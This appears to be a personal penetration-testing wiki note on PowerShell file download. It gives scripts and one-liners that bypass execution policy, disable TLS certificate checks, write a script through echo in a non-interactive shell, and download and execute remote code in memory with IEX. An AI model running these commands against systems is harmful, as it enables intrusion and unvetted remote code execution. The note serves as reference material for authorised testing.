Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-10-16T12:34:38-05:00

====== PowerShell ======
Created Saturday 16 October 2021

Use these scripts to download a file.

===== Remarks =====
* Works on on hosts with powershell installed. Windows XP2 and above, Windows server 2003 SP2 and above
* The scripts below work for both HTTP and HTTPS

===== Usage =====
Execute the snippets below with
{{{code: lang="sh" linenumbers="False"
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
}}}


With non-interactive shell
{{{code: lang="powershell" linenumbers="True"
echo [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} >>wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "<url>:<port>/<filename>" >>wget.ps1
echo $file = "<filename>" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

}}}


With interactive shell
{{{code: lang="powershell" linenumbers="True"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$webclient = New-Object System.Net.WebClient
$url = "<url>:<port>/<filename>"
$file = "<filename>"
$webclient.DownloadFile($url,$file)

}}}


===== One liner =====
The above script as a one-liner:

==== HTTP ====
{{{code: lang="sh" linenumbers="False"
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<ip>:<port>/<filename>', '<filename>')
}}}


==== HTTPS ====
{{{code: lang="sh" linenumbers="False"
powershell.exe [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object System.Net.WebClient).DownloadFile('https://<url>:<port>/<filename>', '<filename>')
}}}



===== Download and execute script =====
This oneline will download and execute a powershell script without storing it on the filesystem.

==== HTTP ====
{{{code: lang="sh" linenumbers="False"
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/<filename>')
}}}


==== HTTPS ====
{{{code: lang="sh" linenumbers="False"
powershell.exe [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (New-Object System.Net.WebClient).DownloadString('https://<ip>:<port>/<filename>')
}}}



